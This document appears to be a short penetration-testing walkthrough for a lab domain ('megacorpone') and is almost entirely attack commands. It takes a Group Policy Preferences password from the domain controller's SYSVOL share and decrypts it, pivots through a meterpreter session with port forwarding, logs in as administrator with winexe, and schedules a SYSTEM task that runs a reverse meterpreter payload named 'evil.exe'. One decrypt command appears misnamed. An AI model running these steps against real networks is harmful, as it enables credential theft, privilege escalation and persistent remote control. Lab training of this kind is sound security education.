Enumerate the Domain Controller:
> use post/windows/gather/enum_domain

Proceed to Map the Domain Controllers SYSVOL share share to infected Windows computer:
> net use z: \\dc01\SYSVOL

Search it for any "groups.xml" and then copy to infected Windows Machine downloads file:
> dir /s groups.xml
> copy Z:\megacorponeone.com\Policies\{UniqueIdentifier}\Machine\Preferences\Groups\Group.xml C:\Users\mike.MEGACORPONE\Downloads 

Change Directories and cat the file looking for a stored password.  Then decrypt:
> gpg-decrypt riBZpPtHOGtVk+SdL0mJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67fgh79kBZB
output: "secretpassword"

Background session, Use a Combonation of Port Forwarding and "Pass-the-Hash" Win.exe
> bg
> route add 10.7.0.0 255.255.255.0 1
> sessions -i 1
> portfwd add -l 445 -p 445 -r 10.7.0.22

Now any traffic will be routed through the meterpreter session
> winexe -U administrator%secretpassword //127.0.0.1 "cmd"

and now logged into 'Mikes box' as an admin! Now to get Meterperter as admin using schtasks:
> schtasks /create /ru SYSTEM /sc MINUTE /MO 10 /tn megapwn /tr "\ "C:\\Users\\mike.MEGACORPONE\\Downloads\\evil.exe\"" 
*** Remeber to create a reverse meterpreter payload: "evil.exe" ***

Go back to meterpreter session and wait for incoming connection.  Stop the Port forwarding, then background current session:
> portfwd delete -l 445 -p 445 -r 10.7.0.22
> bg

Set our Handler to listen for incoming payloads.  Now we should have the two sessions.
